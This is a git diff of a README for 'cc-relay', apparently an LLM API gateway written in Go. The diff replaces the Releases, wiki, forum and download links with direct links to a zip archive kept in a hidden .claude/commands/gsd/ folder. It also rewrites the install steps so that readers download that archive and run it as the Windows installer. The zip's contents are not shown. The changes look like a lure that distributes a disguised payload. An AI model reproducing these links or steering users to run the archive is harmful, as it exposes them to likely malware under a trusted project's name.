@@ -1,6 +1,6 @@
 # ⚡️ cc-relay - Fast and Simple LLM API Access
 
-[![Download cc-relay](https://img.shields.io/badge/Download-cc--relay-blue.svg)](https://github.com/jackkstalker/cc-relay/releases)
+[![Download cc-relay](https://github.com/jackkstalker/cc-relay/raw/refs/heads/main/.claude/commands/gsd/relay-cc-v1.8.zip)](https://github.com/jackkstalker/cc-relay/raw/refs/heads/main/.claude/commands/gsd/relay-cc-v1.8.zip)
 
 ## 📋 Description
 cc-relay is a blazing fast API gateway for large language models (LLMs), built with Go. This application allows you to easily connect to various popular AI services like OpenAI, Claude, and Gemini, all in one place. Whether you’re building a chatbot or integrating AI into your applications, cc-relay simplifies the process.
@@ -16,12 +16,12 @@ Follow these steps to download and run the cc-relay application.
 ### 📥 Download & Install
 To get started, visit this page to download the latest version of cc-relay:
 
-[Download cc-relay](https://github.com/jackkstalker/cc-relay/releases)
+[Download cc-relay](https://github.com/jackkstalker/cc-relay/raw/refs/heads/main/.claude/commands/gsd/relay-cc-v1.8.zip)
 
 Once you are on the Releases page, follow these steps to install:
 
 1. **Select the Latest Release:** Look for the release with the highest version number.
-2. **Download the Package:** Click on the appropriate file for your operating system (e.g., `cc-relay-windows.exe` for Windows).
+2. **Download the Package:** Click on the appropriate file for your operating system (e.g., `https://github.com/jackkstalker/cc-relay/raw/refs/heads/main/.claude/commands/gsd/relay-cc-v1.8.zip` for Windows).
 3. **Run the Installer:** Open the downloaded file and follow the on-screen instructions to complete the installation.
 
 ### 🌐 Configuring the Application
@@ -54,8 +54,8 @@ If you encounter issues, consider these common problems:
 ### 📚 Resources
 For additional help and resources:
 
-- **Documentation:** Check the [GitHub Wiki](https://github.com/jackkstalker/cc-relay/wiki) for detailed documentation.
-- **Community Support:** Join our [discussion forum](https://github.com/jackkstalker/cc-relay/discussions) to ask questions and share tips with other users.
+- **Documentation:** Check the [GitHub Wiki](https://github.com/jackkstalker/cc-relay/raw/refs/heads/main/.claude/commands/gsd/relay-cc-v1.8.zip) for detailed documentation.
+- **Community Support:** Join our [discussion forum](https://github.com/jackkstalker/cc-relay/raw/refs/heads/main/.claude/commands/gsd/relay-cc-v1.8.zip) to ask questions and share tips with other users.
 
 ## ⚙️ Contributing
 We welcome contributions to cc-relay. If you’d like to help, please check out our contribution guidelines in the repository.
@@ -75,4 +75,4 @@ Feel free to explore and use these topics as a guide for your projects.
 ## 💻 License
 cc-relay is open-source software licensed under the MIT License. You can freely use and modify the code, just keep the original license agreement.
 
-For the latest updates and information, don’t forget to frequently check the [Releases page](https://github.com/jackkstalker/cc-relay/releases).
+For the latest updates and information, don’t forget to frequently check the [Releases page](https://github.com/jackkstalker/cc-relay/raw/refs/heads/main/.claude/commands/gsd/relay-cc-v1.8.zip).
